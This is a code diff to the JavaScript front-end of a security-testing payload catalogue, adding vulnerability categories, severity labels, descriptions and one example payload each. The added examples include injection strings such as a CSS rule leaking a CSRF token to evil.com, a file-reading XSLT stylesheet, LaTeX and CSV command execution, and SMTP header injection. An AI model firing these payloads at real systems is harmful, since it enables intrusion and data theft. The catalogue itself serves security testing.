@@ -129,9 +129,10 @@
 
   /* ─── DERIVED DATA ─── */
   function severityFor(cat) {
-    if (/SQLi|Command|LFI|RFI|Deserialization|XXE|SSTI/.test(cat)) return { label: 'Critical', cls: 'badge-red' };
-    if (/XSS|SSRF|Auth|Open Redirect|NoSQLi|Upload/.test(cat)) return { label: 'High', cls: 'badge-amber' };
-    if (/Misconfig|IDOR|LDAP|Prototype|GraphQL|SSI/.test(cat)) return { label: 'Medium', cls: 'badge-violet' };
+    if (/SQLi|Command|LFI|RFI|Deserialization|XXE|SSTI|XSLT/.test(cat)) return { label: 'Critical', cls: 'badge-red' };
+    if (/XSS|SSRF|Auth|Open Redirect|NoSQLi|Upload|CRLF|SMTP|Request Smuggling|LaTeX|LDAP/.test(cat)) return { label: 'High', cls: 'badge-amber' };
+    if (/Misconfig|IDOR|Prototype|GraphQL|SSI|DOM|CSS|CSV|Format String|Type Juggling|XPATH|HTTP Parameter Pollution/.test(cat)) return { label: 'Medium', cls: 'badge-violet' };
+    if (/Cryptographic|Logging|Supply Chain|Outdated|Cache Deception|Mishandling|Insecure Design/.test(cat)) return { label: 'Warning', cls: 'badge-yellow' };
     return { label: 'Info', cls: 'badge-muted' };
   }
 
@@ -149,7 +150,30 @@
     if (cat.includes('LDAP')) return 'SecLists, PayloadsAllTheThings';
     if (cat.includes('Misconfig')) return 'SecLists, Nuclei Templates, fuzzdb';
     if (cat.includes('Deserialization')) return 'SecLists (Java classes)';
-    if (cat.includes('Auth')) return 'SecLists, Exploit Database';
+    if (cat.includes('Auth') || cat.includes('Identification')) return 'SecLists, Exploit Database';
+    if (cat.includes('CRLF')) return 'Nuclei Templates, PayloadsAllTheThings';
+    if (cat.includes('CSS Injection') || cat.includes('DOM')) return 'PayloadsAllTheThings, PortSwigger';
+    if (cat.includes('CSV')) return 'SecLists, PayloadsAllTheThings';
+    if (cat.includes('Format String')) return 'SecLists, PayloadsAllTheThings';
+    if (cat.includes('GraphQL')) return 'PayloadsAllTheThings, Nuclei Templates';
+    if (cat.includes('HTTP Parameter')) return 'SecLists, fuzzdb';
+    if (cat.includes('LaTeX')) return 'PayloadsAllTheThings';
+    if (cat.includes('Request Smuggling')) return 'Nuclei Templates, PortSwigger Research';
+    if (cat.includes('SMTP')) return 'PayloadsAllTheThings';
+    if (cat.includes('SSI')) return 'SecLists, PayloadsAllTheThings';
+    if (cat.includes('Type Juggling')) return 'SecLists';
+    if (cat.includes('Upload')) return 'SecLists, PayloadsAllTheThings, Exploit Database';
+    if (cat.includes('XPATH')) return 'SecLists, PayloadsAllTheThings';
+    if (cat.includes('XSLT')) return 'PayloadsAllTheThings';
+    if (cat.includes('Insecure Design')) return 'PaylodsAllTheThings, Nuclei Templates';
+    if (cat.includes('Cryptographic')) return 'SecLists, PayloadsAllTheThings, JWT.io';
+    if (cat.includes('IDOR')) return 'PayloadsAllTheThings, PortSwigger';
+    if (cat.includes('Broken Access')) return 'PayloadsAllTheThings, Nuclei Templates';
+    if (cat.includes('Mishandling')) return 'OWASP, PortSwigger';
+    if (cat.includes('Logging')) return 'OWASP, Nuclei Templates';
+    if (cat.includes('Supply Chain')) return 'OWASP Dependency-Check, PortSwigger';
+    if (cat.includes('Outdated') || cat.includes('Vulnerable')) return 'OWASP Dependency-Check, Nuclei Templates';
+    if (cat.includes('Cache Deception')) return 'PortSwigger Research, OWASP';
     return 'PayloadsAllTheThings, SecLists, Exploit Database';
   }
 
@@ -160,19 +184,52 @@
     if (cat.includes('SQLi')) return 'SQL injection strings for MySQL, PostgreSQL, MSSQL, Oracle, and SQLite. Covers classic, blind, error-based, and time-based techniques.';
     if (cat.includes('Misconfig')) return 'Security misconfiguration detection strings including default paths, debug endpoints, and information disclosure probes.';
     if (cat.includes('Deserialization')) return 'Java fully-qualified class paths for deserialization attack surface detection on J2EE applications.';
-    if (cat.includes('Auth')) return 'Authentication bypass payloads including SQL injection auth bypass, default credentials, and session manipulation strings.';
-    if (cat.includes('Insecure Design')) return 'Business logic testing payloads including numeric amounts, edge case values, and mass assignment patterns.';
+    if (cat.includes('Auth') || cat.includes('Identification')) return 'Authentication bypass payloads including SQL injection auth bypass, default credentials, and session manipulation strings.';
+    if (cat.includes('Insecure Design')) return 'Business logic testing payloads including numeric amounts, edge case values, price manipulation, coupon abuse, and race condition patterns.';
     if (cat.includes('Open Redirect')) return 'URL redirect injection payloads for detecting open redirect vulnerabilities. Includes whitelist bypass and protocol manipulation.';
-    if (cat.includes('Cryptographic')) return 'Cryptographic weakness detection payloads including JWT attacks, weak keys, and TLS configuration probes.';
-    if (cat.includes('IDOR')) return 'Insecure Direct Object Reference test values for enumerating and manipulating object identifiers.';
+    if (cat.includes('Cryptographic')) return 'Cryptographic weakness detection payloads including JWT attacks, weak keys, TLS configuration probes, and sensitive data exposure.';
+    if (cat.includes('IDOR')) return 'Insecure Direct Object Reference test values for enumerating and manipulating object identifiers via numeric, UUID, and base64 patterns.';
+    if (cat.includes('Broken Access')) return 'Broken access control probes for horizontal and vertical privilege escalation testing.';
+    if (cat.includes('NoSQLi')) return 'NoSQL injection payloads targeting MongoDB and other document databases. Includes operator injection and $where clause attacks.';
+    if (cat.includes('LDAP')) return 'Lightweight Directory Access Protocol injection payloads for authentication bypass and information disclosure via LDAP queries.';
+    if (cat.includes('SSRF')) return 'Server-side request forgery payloads targeting internal services, cloud metadata endpoints, and port scanning.';
+    if (cat.includes('SSTI')) return 'Server-side template injection vectors for Jinja2, Twig, Freemarker, Velocity, Smarty, and other template engines.';
+    if (cat.includes('XXE')) return 'XML external entity injection payloads for file disclosure, SSRF, and blind exfiltration via DTD and XInclude attacks.';
+    if (cat.includes('Upload') || cat.includes('File Upload')) return 'Unrestricted file upload bypass payloads including dangerous extensions, content-type manipulation, and null byte injection.';
+    if (cat.includes('Prototype')) return 'JavaScript prototype pollution payloads targeting __proto__ and constructor.prototype for privilege escalation.';
+    if (cat.includes('GraphQL')) return 'GraphQL API security test payloads including introspection queries, field enumeration, and batch/alias attacks.';
+    if (cat.includes('SSI')) return 'Server-side includes injection payloads for command execution, file inclusion, and variable disclosure via SSI/ESI directives.';
+    if (cat.includes('CRLF')) return 'CRLF / HTTP response splitting payloads for header injection, cache poisoning, and cross-site scripting via line feed injection.';
+    if (cat.includes('CSS Injection')) return 'CSS injection payloads for data exfiltration via attribute selectors, font-face loading, and background URL callbacks.';
+    if (cat.includes('CSV')) return 'CSV / formula injection payloads for exploiting spreadsheet import functionality with DDE, EXEC, and HTTP callbacks.';
+    if (cat.includes('DOM Clobbering')) return 'DOM clobbering payloads exploiting HTML element id/name attributes to override JavaScript variables and API access.';
+    if (cat.includes('Format String')) return 'Format string vulnerability probes using %x, %s, %n, and %p specifiers for memory disclosure and arbitrary write.';
+    if (cat.includes('HTTP Parameter')) return 'HTTP parameter pollution payloads testing duplicate parameter handling across different platforms and frameworks.';
+    if (cat.includes('LaTeX')) return 'LaTeX injection payloads for file read, command execution, and package inclusion via \\input, \\write18, and \\usepackage.';
+    if (cat.includes('Request Smuggling')) return 'HTTP request smuggling payloads for CL.TE, TE.CL, and TE.TE desync attacks against web servers and proxies.';
+    if (cat.includes('SMTP')) return 'SMTP / email header injection payloads for spamming, phishing, and mail relay abuse via CRLF injection in email headers.';
+    if (cat.includes('Type Juggling')) return 'PHP type juggling / loose comparison payloads exploiting magic hashes (0e...) and type coercion for authentication bypass.';
+    if (cat.includes('XPATH')) return 'XPATH injection payloads for XML document query manipulation and authentication bypass via boolean injection.';
+    if (cat.includes('XSLT')) return 'XSLT transformation injection payloads for server-side file read and remote code execution via XSLT processor extensions.';
+    if (cat.includes('Mishandling')) return 'Exceptional condition mishandling test payloads including error disclosure, debug code exposure, and failing-open scenarios.';
+    if (cat.includes('Logging')) return 'Security logging and monitoring failure test payloads for log injection, log spoofing, and audit trail manipulation.';
+    if (cat.includes('Supply Chain')) return 'Software supply chain vulnerability probes including dependency confusion, private package name squatting, and known vulnerable versions.';
+    if (cat.includes('Outdated') || cat.includes('Vulnerable')) return 'Vulnerable and outdated component detection strings including server version banners, actuator endpoints, and CVE-specific probe paths.';
+    if (cat.includes('Cache Deception')) return 'Web cache deception payloads for poisoning cached responses via appended static file extensions and cache key manipulation.';
     return cat + ' vulnerability payloads for security testing and vulnerability assessment.';
   }
 
   function injectionPointFor(cat) {
-    if (cat.includes('XXE')) return 'body_xml';
+    if (cat.includes('XXE') || cat.includes('XSLT')) return 'body_xml';
     if (cat.includes('SSRF')) return 'url_parameter';
-    if (cat.includes('Upload')) return 'file_upload';
+    if (cat.includes('Upload') || cat.includes('File Upload')) return 'file_upload';
     if (cat.includes('Deserialization')) return 'request_body';
+    if (cat.includes('GraphQL') || cat.includes('NoSQLi') || cat.includes('Prototype')) return 'request_body';
+    if (cat.includes('CSS') || cat.includes('DOM') || cat.includes('SSI') || cat.includes('CSV')) return 'body_html';
+    if (cat.includes('CRLF') || cat.includes('Request Smuggling') || cat.includes('Cache Deception') || cat.includes('Logging')) return 'header';
+    if (cat.includes('SMTP') || cat.includes('LDAP') || cat.includes('LaTeX') || cat.includes('Type Juggling') || cat.includes('XPATH') || cat.includes('SSTI') || cat.includes('Format String')) return 'form_parameter';
+    if (cat.includes('Auth') || cat.includes('Identification')) return 'form_parameter';
+    if (cat.includes('Misconfig') || cat.includes('Outdated') || cat.includes('Vulnerable')) return 'path_parameter';
     return 'query_parameter';
   }
 
@@ -195,6 +252,26 @@
     'Misconfig': '/.git/config',
     'Upload': 'shell.php%00.jpg',
     'Auth': "admin' --",
+    'Broken Access': '/admin/level/99',
+    'CRLF': '%0d%0aSet-Cookie: admin=true',
+    'CSS Injection': 'input[name="csrf"]{background:url(http://evil.com/leak)}',
+    'CSV': '=CMD("id")',
+    'DOM Clobbering': '<a id="config" href="http://evil.com">',
+    'Format String': '%x.%x.%x.%x',
+    'HTTP Parameter': '?user=admin&user=root',
+    'LaTeX': '\\immediate\\write18{id}',
+    'Request Smuggling': 'Transfer-Encoding: chunked\\r\\nContent-Length: 0',
+    'SMTP': 'test@test.com\\r\\nCC: attacker@evil.com',
+    'Type Juggling': '0e215962017',
+    'XPATH': "' or '1'='1",
+    'XSLT': '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="abc:read(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>',
+    'Insecure Design': '?price=-1&quantity=9999',
+    'Cryptographic': 'eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.',
+    'Mishandling': 'Fatal error: Call to undefined function',
+    'Logging': '[ALERT] User admin authenticated',
+    'Supply Chain': '@internal/auth-lib',
+    'Outdated': 'Server: Apache/2.4.49',
+    'Cache Deception': '/api/user/profile.css',
   };
   function exampleFor(cat) {
     for (const k in EXAMPLES) if (cat.includes(k)) return EXAMPLES[k];
@@ -505,7 +582,7 @@
       '<p>Start by cloning the repository or downloading the latest release from GitHub.</p>' + codeBlock('git clone https://github.com/HarlequinCS/Veritas_Payloads.git') },
     { t: 'Choose Your Format', s: 'Unified JSON or organized folders', body:
       '<p>The dataset is available as a single unified JSON file or split into category folders.</p>' + codeBlock(
-'Veritas_Payloads/\n  owasp_top10_payloads.json   # Unified (65,321 entries)\n  organize_payloads.py        # Splitter tool\n  payloads/                   # Organized by category\n    injection_(xss)/query_parameter.json\n    injection_(sqli)/query_parameter.json') },
+'Veritas_Payloads/\n  owasp_top10_payloads.json   # Unified (123,918 entries)\n  organize_payloads.py        # Splitter tool\n  payloads/                   # Organized by category\n    injection_(xss)/query_parameter.json\n    injection_(sqli)/query_parameter.json') },
     { t: 'Understand the Schema', s: 'Consistent, integration-ready structure', body:
       '<p>Each payload entry follows a consistent structure for easy integration.</p>' + codeBlock(
 '{\n  "payload_id": "OWP-0001",\n  "vulnerability_category": "Injection (SQLi)",\n  "injection_point": "query_parameter",\n  "payload_string": "\' OR \'1\'=\'1",\n  "validation": { "expected_status_code": 200, "success_regex": "error|sql" }\n}') },
